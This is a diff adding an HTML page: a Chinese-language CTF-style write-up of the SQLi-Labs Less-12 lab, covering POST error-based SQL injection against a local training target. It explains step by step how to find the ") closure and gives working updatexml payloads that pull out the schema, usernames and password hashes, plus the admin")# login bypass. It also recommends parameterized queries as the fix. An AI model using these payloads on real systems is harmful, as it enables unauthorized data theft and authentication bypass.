@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Writeup: SQLi-Labs Less-12 - Y11516</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0e17; background-image: radial-gradient(circle at 50% 20%, rgba(0, 240, 255, 0.05) 0%, transparent 50%); font-family: 'Inter', sans-serif; color: #ccd6f6; padding: 6rem 1rem 4rem 1rem; display: flex; justify-content: center; line-height: 1.8; }
+        .navbar { position: fixed; top: 0; left: 0; width: 100%; padding: 1.2rem 5%; display: flex; justify-content: space-between; align-items: center; background: rgba(10, 14, 23, 0.7); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(0, 240, 255, 0.15); z-index: 999; }
+        .logo { font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 1.2rem; color: #00f0ff; letter-spacing: 2px; }
+        .nav-links a { color: #8892b0; text-decoration: none; margin-left: 2rem; font-size: 0.9rem; transition: 0.3s; }
+        .nav-links a:hover { color: #00f0ff; }
+        .post-container { max-width: 820px; width: 100%; background: rgba(255,255,255,0.03); backdrop-filter: blur(6px); border: 1px solid rgba(255,255,255,0.06); border-radius: 32px; padding: 3rem; box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6); }
+        h1 { font-family: 'Orbitron', sans-serif; font-size: 2.2rem; margin-bottom: 0.5rem; color: #00f0ff; text-shadow: 0 0 15px rgba(0, 240, 255, 0.3); }
+        .date { color: #475569; font-size: 0.9rem; margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 1px solid rgba(0, 240, 255, 0.2); display: flex; gap: 15px; flex-wrap: wrap;}
+        .date span { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.8rem; border-radius: 12px; color: #00f0ff; font-size: 0.8rem; }
+        h2 { color: #a855f7; font-size: 1.4rem; margin: 2.5rem 0 1rem 0; border-left: 4px solid #a855f7; padding-left: 10px; }
+        h3 { color: #e2e8f0; font-size: 1.15rem; margin: 1.8rem 0 0.8rem 0; }
+        h4 { color: #c084fc; font-size: 1rem; margin: 1.2rem 0 0.6rem 0; }
+        p { margin-bottom: 1rem; color: #94a3b8; }
+        strong { color: #e2e8f0; }
+        code { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.4rem; border-radius: 4px; font-family: 'Courier New', monospace; color: #00f0ff; font-size: 0.95rem; }
+        pre { background: #0f172a; padding: 1rem; border-radius: 8px; overflow-x: auto; border: 1px solid #1e293b; margin-bottom: 1rem; }
+        pre code { background: transparent; padding: 0; color: #e2e8f0; }
+        ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; color: #94a3b8; }
+        li { margin-bottom: 0.5rem; }
+        .highlight-box { background: rgba(168, 85, 247, 0.05); border: 1px solid rgba(168, 85, 247, 0.2); border-radius: 12px; padding: 1.5rem; margin-bottom: 1rem; }
+        .note-box { background: rgba(0, 240, 255, 0.05); border-left: 3px solid #00f0ff; padding: 1rem; margin-bottom: 1rem; border-radius: 0 8px 8px 0; }
+        .action-bar { display: flex; justify-content: center; gap: 1.5rem; margin-top: 3rem; flex-wrap: wrap; }
+        .action-link { color: #00f0ff; text-decoration: none; border: 1px solid #00f0ff; padding: 10px 24px; border-radius: 30px; transition: 0.3s; }
+        .action-link:hover { background: rgba(0, 240, 255, 0.1); }
+        .action-link.secondary { color: #8892b0; border-color: #475569; }
+        @media (max-width: 640px) { .post-container { padding: 1.5rem; } h1 { font-size: 1.5rem; } .action-bar { flex-direction: column; } }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="logo"><i class="fas fa-shield-halved"></i> Y11516</div>
+        <div class="nav-links">
+            <a href="/ctf.html"><i class="fas fa-bug"></i> CTF 总库</a>
+            <a href="/"><i class="fas fa-house"></i> 主页</a>
+        </div>
+    </nav>
+
+    <div class="post-container">
+        <h1><i class="fas fa-database"></i> SQLi-Labs Less-12</h1>
+        <div class="date">
+            <span><i class="far fa-calendar-alt"></i> 2026年9月26日</span>
+            <span><i class="fas fa-tag"></i> SQLi-Labs</span>
+            <span><i class="fas fa-tag"></i> Web安全</span>
+            <span><i class="fas fa-tag"></i> SQL注入</span>
+            <span><i class="fas fa-tag"></i> POST报错注入</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>SQLi-Labs Less-12 (POST - Error Based - Double quotes- String - with twist)</li>
+            <li><strong>题目平台：</strong>SQLi-Labs 本地靶场</li>
+            <li><strong>题目类型：</strong>Web安全 / SQL注入 / POST型报错注入 / 双引号加括号闭合</li>
+            <li><strong>靶场链接：</strong>http://localhost:8081/Less-12/（本地环境）</li>
+            <li><strong>涉及工具：</strong>Chrome浏览器 (F12开发者工具)</li>
+        </ul>
+
+        <h2>二、解题步骤</h2>
+        
+        <h3>1. 分析题目考什么</h3>
+        <p>本题的核心考点是<strong>基于双引号加括号闭合的 POST 型报错注入</strong>。Less-11 使用的是单引号闭合，而 Less-12 官方标记了 "with twist"（有小把戏），这个"把戏"就是指后端代码不仅仅用了双引号，还套了一层括号。攻击者必须使用 <code>")</code> 来闭合前面的语法，然后利用 <code>updatexml</code> 报错函数回显数据。同时，还需要绕过字符集冲突和报错截断等坑。</p>
+
+        <h3>2. 怎么想（破题思路）</h3>
+        <ul>
+            <li>先输入 <code>admin'</code>，页面报错，说明存在注入，但可能闭合方式不对。</li>
+            <li>输入 <code>admin")</code>，页面再次报错，但报错信息中泄露了闭合结构，确认漏洞存在。</li>
+            <li>使用报错函数 <code>updatexml</code> 构造 payload，一步步爆出库名、表名、字段名和数据。</li>
+            <li>如果只是为了通关，可以直接使用万能密码 <code>admin")#</code> 绕过密码验证。</li>
+        </ul>
+
+        <h3>3. 怎么解（详细步骤与踩坑记录）</h3>
+        
+        <div class="note-box">
+            <h4><i class="fas fa-exclamation-triangle"></i> 踩坑记录一：盲猜闭合符号失败（with twist 的陷阱）</h4>
+            <p><strong>踩坑情况：</strong>按照 Less-11 的经验直接输入 <code>admin'</code>，页面报错，但加上 <code>#</code> 注释后依然报错，无法注入。</p>
+            <p><strong>原因分析：</strong>Less-12 的 SQL 语句是 <code>WHERE username=("$username")</code>，不仅有双引号，还有一个括号。只闭合单引号或双引号都不够。这就是所谓的 "with twist"。</p>
+            <p><strong>改进方式：</strong>尝试闭合双引号和括号 <code>admin")</code>。提交后，页面的报错信息变为 <code>near '") and password=("123") LIMIT 0,1'</code>，成功确认闭合方式为 <code>")</code>。</p>
+        </div>
+
+        <div class="note-box">
+            <h4><i class="fas fa-exclamation-triangle"></i> 踩坑记录二：获取表名时出现字符集排序冲突报错</h4>
+            <p><strong>踩坑情况：</strong>输入 <code>admin") and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1)#</code> 时，页面报错：<code>Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (latin1_swedish_ci,COERCIBLE) for operation '='</code>。</p>
+            <p><strong>原因分析：</strong>MySQL 系统自带的 <code>information_schema</code> 库默认字符集是 <code>gbk</code>，而靶场数据库是 <code>latin1</code>。当两者进行比较（<code>table_schema='security'</code>）时，发生了字符集冲突。</p>
+            <p><strong>改进方式：</strong>把字符串硬编码改为十六进制形式，或者使用 <code>database()</code> 函数替代 <code>'security'</code>。例如写 <code>table_name=0x7573657273</code>（0x 是十六进制前缀，7573657273 是 users 的十六进制编码），这样就能完美绕过字符集冲突。</p>
+        </div>
+
+        <div class="note-box">
+            <h4><i class="fas fa-exclamation-triangle"></i> 踩坑记录三：updatexml 回显长度截断问题</h4>
+            <p><strong>踩坑情况：</strong>查密码时，页面报错显示 <code>XPATH syntax error: '~'</code>。</p>
+            <p><strong>原因分析：</strong><code>updatexml</code> 报错回显的最大限制是 32 个字符。密码的 MD5 值刚好 32 位，加上边界符号 <code>~</code> 会导致超长截断，或者数据被截断显示不全。</p>
+            <p><strong>改进方式：</strong>使用 <code>substr()</code> 函数分段截取。例如 <code>substr((select password from users limit 0,1),1,30)</code> 截取前 30 位，再 <code>substr(...,31,32)</code> 截取后 2 位，拼接即可。或者干脆使用偷懒终极方法：万能密码登录。</p>
+        </div>
+
+        <div class="highlight-box">
+            <h4><i class="fas fa-terminal"></i> 详细实操步骤（Payload逐字解释）</h4>
+            
+            <p><strong>第一步：探测闭合方式</strong></p>
+            <p>Username 输入 <code>admin")</code>，Password 随便填。报错 <code>near '") and password=("123") LIMIT 0,1'</code>，说明闭合成功，后端语句类似 <code>SELECT * FROM users WHERE username=("admin") AND password=("123") LIMIT 0,1;</code>。</p>
+
+            <p><strong>第二步：获取数据库名</strong></p>
+            <pre><code>admin") and updatexml(1,concat(0x7e,(select database()),0x7e),1)#</code></pre>
+            <p><strong>逐字解析：</strong></p>
+            <ul>
+                <li><code>admin")</code>：闭合原有 SQL 语句中的 <code>username=("</code>，使得后面的代码能被当作 SQL 指令执行。</li>
+                <li><code>and</code>：逻辑与，连接闭合后的语句和我们的注入语句。</li>
+                <li><code>updatexml(1, XPath格式字符串, 1)</code>：MySQL 用于更新 XML 的函数。当第二个参数不符合 XPath 语法时，会抛出错误并显示这个字符串。这是报错注入的核心。</li>
+                <li><code>concat(0x7e, (select database()), 0x7e)</code>：<code>concat</code> 拼接字符串。<code>0x7e</code> 是波浪号 <code>~</code> 的十六进制，用作边界标识。中间的 <code>(select database())</code> 是获取当前库名的子查询。</li>
+                <li><code>#</code>：注释符，把原 SQL 剩下的 <code>") AND password=("...") LIMIT 0,1;</code> 全部注释掉，保持语法闭合。</li>
+            </ul>
+            <p>回显：<code>XPATH syntax error: '~security~'</code>，成功拿到数据库名！</p>
+
+            <p><strong>第三步：获取表名</strong></p>
+            <pre><code>admin") and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)#</code></pre>
+            <p>回显 <code>~emails~</code>。接着查第二个表，将 <code>limit 0,1</code> 改为 <code>limit 1,1</code>，或者直接查目标表：</p>
+            <pre><code>admin") and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() and table_name=0x7573657273 limit 0,1),0x7e),1)#</code></pre>
+            <p>回显 <code>~users~</code>。注意这里使用了十六进制 <code>0x7573657273</code> 来规避字符集冲突。</p>
+
+            <p><strong>第四步：获取字段名</strong></p>
+            <pre><code>admin") and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=0x7573657273 limit 0,1),0x7e),1)#</code></pre>
+            <p>把 <code>tables</code> 换成 <code>columns</code>，依次把 <code>limit 0,1</code> 改为 <code>1,1</code>、<code>2,1</code>，拿到字段名：<code>id</code>、<code>username</code>、<code>password</code>。</p>
+
+            <p><strong>第五步：获取数据与通关</strong></p>
+            <pre><code>-- 拿用户名
+admin") and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)#
+-- 拿密码（分段截取防截断）
+admin") and updatexml(1,concat(0x7e,substr((select password from users limit 0,1),1,30)),1)#</code></pre>
+            <p>成功拿到 Dumb/Dumb 或 admin/admin。最后回到登录框，Username 填 <code>Dumb</code>，Password 填 <code>Dumb</code>，成功登录。</p>
+            <p><strong>终极逃课法（万能密码）：</strong>直接在 Username 输入 <code>admin")#</code>，Password 随便填，点击 Submit。因为 <code>#</code> 把后面的密码验证全注释了，SQL 变成 <code>SELECT * FROM users WHERE username=("admin")#</code>，直接登录成功。</p>
+        </div>
+
+        <h3>4. 怎么迁移（跨领域联想）</h3>
+        <ul>
+            <li><strong>代码审计：</strong><code>")</code> 这种看起来多此一举的闭合方式，在 PHP 代码里通常是因为开发者写了 <code>WHERE username=('$username')</code> 这种冗余的括号。在代码审计中，看到这种非标准写法往往意味着存在特殊的注入方式，需要特别留意。</li>
+            <li><strong>API 接口安全：</strong>在 RESTful API 中，POST 请求体（JSON/XML）也可能被拼接进 SQL。测试接口时，注入思路与 POST 表单类似，都需要考虑各种引号和括号的闭合组合。</li>
+            <li><strong>逻辑漏洞防范：</strong>万能密码之所以生效，根本原因是后端把用户输入当成了 SQL 代码。解决的终极办法是使用参数化查询（Prepared Statements），确保代码和数据分离。</li>
+        </ul>
+
+        <h2>三、名词大全与原理深度复盘</h2>
+        
+        <div class="highlight-box">
+            <h4>1. with twist（小把戏）</h4>
+            <p>SQLi-Labs 靶场的一个幽默说法，特指 Less-12 在闭合方式上做了变化，从 Less-11 的单引号变成了双引号加括号 <code>")</code>，增加了新手盲猜的难度。</p>
+
+            <h4>2. POST 注入</h4>
+            <p>数据通过 HTTP 请求体（Request Body）发送。一般出现在登录框、注册框等需要提交表单的地方。与 GET 注入的区别在于，POST 注入无法直接在 URL 修改，必须使用抓包工具或开发者工具修改请求体。</p>
+
+            <h4>3. 报错注入（Error-Based）</h4>
+            <p>利用数据库执行错误时抛出的信息，将想要查询的数据通过非法格式（如调用 <code>updatexml</code>）拼接在错误信息中带出来。是一种非常高效的数据回显方式。</p>
+
+            <h4>4. updatexml() 与 32字节回显限制</h4>
+            <p><code>updatexml(XML_document, XPath_string, new_value)</code> 第二个参数必须是合法的 XPath 格式。当传入类似 <code>~security~</code> 的字符串时，MySQL 报错并抛出它。回显上限为 32 字节，所以如果数据过长（如 32 位 MD5），需要用 <code>substr()</code> 分段截取。</p>
+
+            <h4>5. information_schema 数据库</h4>
+            <p>MySQL 自带的一个元数据数据库。它里面存储了所有数据库、表、列的名字。常用的两张表是 <code>tables</code> 和 <code>columns</code>。攻击者通过查询这张表，就能摸清整个数据库的架构。</p>
+        </div>
+
+        <h2>四、题目思考</h2>
+        
+        <h3>1. 这跟前面的题有什么区别？</h3>
+        <ul>
+            <li><strong>与 Less-11 的区别：</strong>Less-11 是单引号闭合（<code>admin'</code>），Less-12 是双引号加括号闭合（<code>admin")</code>）。这就是官方说的 "with twist"。</li>
+            <li><strong>与 Less-1~10 的区别：</strong>Less-1 到 Less-10 都是 GET 请求，Less-11 和 Less-12 变成了 POST 请求，数据提交方式发生了改变。</li>
+        </ul>
+
+        <h3>2. 这种题目的出现原因（为什么存在）</h3>
+        <p>开发者写 SQL 语句时，出于习惯或者思维惯性，写出了 <code>WHERE username=("$username")</code> 这样冗余的代码。虽然看起来只是加了双引号和括号，但对于 SQL 解析器来说，闭合规则变了。这警示我们：安全防御不能靠隐藏闭合符号，而应该在数据进入数据库之前进行严格的类型检查和参数化处理。</p>
+
+        <h3>3. 这种应用在实际中如何体现？</h3>
+        <p>在实际渗透测试中，拿到一个 POST 登录接口，通常会用 Burp Suite 抓包，保存为 <code>req.txt</code>，然后用 SQLMap 进行自动化注入测试（<code>sqlmap -r req.txt</code>），这只是基础。如果遇到 WAF 拦截，就需要手工构造各种花式的闭合语句（如 <code>')</code>, <code>"))</code> 等）来尝试绕过。</p>
+
+        <h3>4. 如何抽象理解概念（大白话）</h3>
+        <div class="highlight-box">
+            <p><strong>把数据库比作一个“严格的门卫”：</strong></p>
+            <ul>
+                <li>Less-11 的门卫要求暗号是单引号 <code>'</code>。</li>
+                <li>Less-12 的门卫换了个规矩，暗号变成了双引号加括号 <code>")</code>。</li>
+                <li>如果你给的是单引号，他不认识，直接把你轰出去（报错，无法注入）。只有给对了 <code>")</code>，他才会和你说话。这就像是 "with twist" 小把戏，测试的是渗透人员面对变化时的灵活应变能力。</li>
+            </ul>
+        </div>
+
+        <p style="margin-top: 2rem; text-align: center; color: #475569;"><i class="fas fa-code"></i> 做一道题，就要往自己脑子里装点东西。</p>
+
+        <div class="action-bar">
+            <a href="/ctf.html" class="action-link"><i class="fas fa-arrow-left"></i> 返回 CTF 总库</a>
+            <a href="/" class="action-link secondary"><i class="fas fa-house"></i> 返回主页</a>
+        </div>
+    </div>
+</body>
+</html>
